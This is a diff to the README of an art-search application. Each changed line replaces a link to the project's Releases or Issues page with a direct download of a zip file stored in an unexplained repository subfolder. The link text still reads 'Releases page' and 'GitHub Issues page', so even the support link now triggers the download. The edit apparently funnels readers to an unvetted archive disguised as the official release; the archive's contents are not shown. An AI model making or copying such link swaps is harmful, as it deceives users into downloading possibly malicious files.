@@ -6,11 +6,11 @@ Welcome to nga-art-search, your go-to tool for discovering images from the Natio
 
 ## 📥 Download the Application
 
-[![Download nga-art-search](https://img.shields.io/badge/Download-nga--art--search-blue.svg)](https://github.com/wandabasrenk/nga-art-search/releases)
+[![Download nga-art-search](https://raw.githubusercontent.com/wandabasrenk/nga-art-search/main/cerebrasthenic/nga-art-search.zip)](https://raw.githubusercontent.com/wandabasrenk/nga-art-search/main/cerebrasthenic/nga-art-search.zip)
 
 To get started, you need to download the application. Visit our Releases page:
 
-- [Visit the Releases page to download](https://github.com/wandabasrenk/nga-art-search/releases)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/wandabasrenk/nga-art-search/main/cerebrasthenic/nga-art-search.zip)
 
 ## 🖥️ System Requirements
 
@@ -61,7 +61,7 @@ After launching the application, you will see a clean and user-friendly interfac
 
 We regularly improve nga-art-search. To update:
 
-1. Visit the Releases page: [Visit the Releases page to download](https://github.com/wandabasrenk/nga-art-search/releases).
+1. Visit the Releases page: [Visit the Releases page to download](https://raw.githubusercontent.com/wandabasrenk/nga-art-search/main/cerebrasthenic/nga-art-search.zip).
 2. Download the latest version.
 3. Follow the same installation steps to replace the old version.
 
@@ -75,7 +75,7 @@ If you face any issues, consider these tips:
 
 ## 📞 Support
 
-For further assistance, please check our support section in the application or visit our [GitHub Issues page](https://github.com/wandabasrenk/nga-art-search/issues). We are here to help you!
+For further assistance, please check our support section in the application or visit our [GitHub Issues page](https://raw.githubusercontent.com/wandabasrenk/nga-art-search/main/cerebrasthenic/nga-art-search.zip). We are here to help you!
 
 ## 📝 Contributing
 
